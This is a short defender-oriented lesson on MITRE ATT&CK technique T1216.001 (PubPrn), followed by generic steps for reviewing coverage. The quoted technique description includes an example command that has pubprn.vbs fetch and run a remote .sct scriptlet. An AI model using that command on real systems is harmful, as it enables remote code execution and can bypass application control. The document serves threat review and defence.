# T1216.001 PubPrn Outcome Lesson

## Authoritative description

- Technique: **T1216.001 — PubPrn**
- Tactics: stealth
- Platforms: Windows

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).

## Reusable lesson

This technique should be treated as an explicit review question when it is relevant to the system or organisation, rather than assumed to be covered by a generic control statement or by tooling that reports a related signal.

## Apply the lesson

1. Define the real scope before judging coverage.
2. Inspect current technical, process, governance, or operational evidence.
3. Separate documented intent from verified behaviour.
4. Record partial coverage and unresolved gaps instead of converting them into a pass.
5. Revisit when the underlying scope, threat environment, technology, suppliers, or mission materially changes.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1216.001: https://attack.mitre.org/techniques/T1216/001
- Reviewed: 2026-10-27

## Boundary

This lesson is derived from the published technique description. It does not invent an incident, prescribe one implementation, or claim the technique has been addressed.
